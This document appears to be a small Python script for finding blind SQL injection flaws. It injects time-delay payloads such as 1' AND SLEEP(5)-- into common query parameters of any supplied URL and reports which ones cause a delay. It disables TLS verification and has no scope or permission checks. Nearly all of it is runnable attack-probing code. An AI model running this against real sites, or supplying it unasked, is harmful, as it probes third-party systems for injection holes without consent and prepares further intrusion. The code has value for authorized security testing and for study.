#!/usr/bin/env python3
"""
Blind SQL Injection Scanner
Tests for blind SQLi vulnerabilities
"""

import requests
import time
import argparse
import warnings
warnings.filterwarnings('ignore')

PAYLOADS = [
    ("1' AND SLEEP(5)--", 5),
    ("1' AND SLEEP(3)--", 3),
    ("1'; WAITFOR DELAY '00:00:05'--", 5),
]

def scan(target):
    print(f"[*] Blind SQLi Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    found = []
    params = ['id', 'user', 'page', 'q', 'search']
    
    for param in params:
        for payload, delay in PAYLOADS[:2]:
            start = time.time()
            try:
                r = requests.get(target, params={param: payload}, timeout=15, verify=False)
                elapsed = time.time() - start
                
                if elapsed >= delay:
                    print(f"[!] Blind SQLi: {param}")
                    found.append(param)
            except:
                pass
    
    print("\n" + "="*50)
    print(f"[*] Found {len(found)} blind SQLi")
    
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Blind SQLi')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)